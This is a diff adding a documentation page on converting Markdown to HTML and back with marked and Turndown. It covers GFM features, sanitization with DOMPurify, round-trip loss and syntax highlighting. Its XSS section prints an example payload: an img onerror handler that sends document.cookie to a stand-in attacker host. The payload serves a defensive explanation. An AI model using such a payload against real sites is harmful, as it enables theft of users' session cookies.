@@ -1,0 +1,99 @@
+---
+title: Complete guide to converting Markdown to HTML and HTML to Markdown
+description: How marked and Turndown work, CommonMark vs GFM differences, XSS risks from raw HTML in Markdown, syntax highlighting, and round-trip lossiness.
+updated: 2026-05-26
+---
+
+## Why convert between Markdown and HTML
+
+Markdown is the writing format — fast to type, easy to read in source form, portable across editors. HTML is the rendering format — what browsers actually display, what email clients send, what CMS platforms store. The two formats serve different stages of the same content lifecycle, and you'll need to move between them more often than you'd think:
+
+- Migrating a blog from a Markdown-based static site generator to a CMS that stores HTML
+- Taking HTML from a WYSIWYG editor and converting it to Markdown for a docs repository
+- Rendering Markdown to HTML for email templates or PDF generation
+- Inspecting what HTML a Markdown snippet will actually produce before deploying
+
+## Markdown to HTML: how `marked` works
+
+This tool uses [marked](https://marked.js.org/), one of the fastest and most widely deployed Markdown parsers in JavaScript. It converts Markdown source to an HTML string in a single synchronous pass.
+
+marked supports both **CommonMark** (the strict, unambiguous Markdown spec) and **GitHub Flavored Markdown (GFM)** extensions. GFM is enabled by default because it's what most developers expect — it adds:
+
+- **Tables** — `| col | col |` pipe syntax
+- **Strikethrough** — `~~text~~`
+- **Task lists** — `- [ ] item` / `- [x] item`
+- **Autolinks** — bare URLs become clickable links automatically
+- **Fenced code blocks** — triple-backtick ` ``` ` with optional language hint
+
+Disable GFM mode if you need strict CommonMark compliance (some specs and publishing platforms require it).
+
+## The XSS risk: raw HTML in Markdown
+
+Markdown allows embedding raw HTML. This is intentional — it lets authors do things Markdown syntax doesn't support, like `<details>`, `<sub>`, `<kbd>`. But it also means **untrusted Markdown is an XSS vector**:
+
+```markdown
+Normal paragraph.
+
+<script>alert('XSS')</script>
+
+<img src="x" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+```
+
+If you render this without sanitization, the script and event handler execute in the user's browser. This matters whenever you accept Markdown from users — blog comments, user profiles, wiki pages, issue trackers.
+
+The tool's sanitization option runs the HTML output through [DOMPurify](https://github.com/cure53/DOMPurify) after rendering, which strips `<script>` tags, `javascript:` hrefs, event handler attributes (`onerror`, `onclick`, etc.), and other vectors. Enable sanitization whenever the Markdown source comes from user input. It's safe to leave it off for your own content — sanitization may strip intentional raw HTML like `<details>` blocks.
+
+## HTML to Markdown: how Turndown works
+
+Converting HTML back to Markdown uses [Turndown](https://github.com/mixmark-io/turndown), which walks the HTML DOM tree and maps each element to its Markdown equivalent. The conversion is rule-based:
+
+- `<h1>` → `# Heading`
+- `<strong>` → `**bold**`
+- `<a href="url">text</a>` → `[text](url)`
+- `<ul><li>` → `- item`
+- `<pre><code>` → fenced code block
+- `<table>` → GFM pipe table (requires the GFM plugin)
+
+## Round-trip lossiness: what doesn't survive
+
+Converting Markdown → HTML → Markdown (or the reverse) is lossy. Do not expect round-trips to be idempotent:
+
+**What gets lost Markdown→HTML→Markdown:**
+- Setext-style headings (`===` underlines) become ATX-style (`#`)
+- Reference-style links `[text][ref]` become inline links `[text](url)`, the reference definitions disappear
+- HTML comments `<!-- … -->` may be dropped by sanitization
+- Indented code blocks may become fenced
+- Custom HTML that Turndown doesn't have a rule for becomes a raw HTML block or is dropped
+
+**What gets lost HTML→Markdown:**
+- CSS classes and inline styles — Markdown has no styling
+- `id` attributes — Markdown headings have no ID syntax (though some renderers auto-generate them)
+- Complex table features: colspan, rowspan, merged cells
+- `<div>` and generic containers with no Markdown equivalent
+- Nested lists beyond what Turndown handles cleanly
+
+For one-way publishing pipelines (write in Markdown, publish as HTML), lossiness doesn't matter. For bidirectional editing, it does.
+
+## Syntax highlighting
+
+Fenced code blocks with a language hint produce `<code class="language-js">` in the HTML output. Syntax highlighting is not applied by the converter itself — that's a rendering step done by libraries like [Prism](https://prismjs.com/) or [highlight.js](https://highlightjs.org/) in the browser or build step. The language class is preserved in the output so your highlighting library can pick it up.
+
+## Embedding HTML in Markdown
+
+When HTML is embedded in Markdown and GFM mode is enabled, marked treats HTML blocks as-is. One common gotcha: a blank line must separate HTML blocks from Markdown paragraphs, or marked may not recognize the transition:
+
+```markdown
+Some text above.
+
+<div class="note">
+This is raw HTML inside Markdown.
+</div>
+
+Some text below.
+```
+
+Without the blank lines around the `<div>`, behavior is parser-dependent. The blank lines are required by the CommonMark spec and honored by marked.
+
+## Privacy
+
+All conversion runs in your browser using marked and Turndown. Your content is never sent to our servers. Both libraries are MIT-licensed.
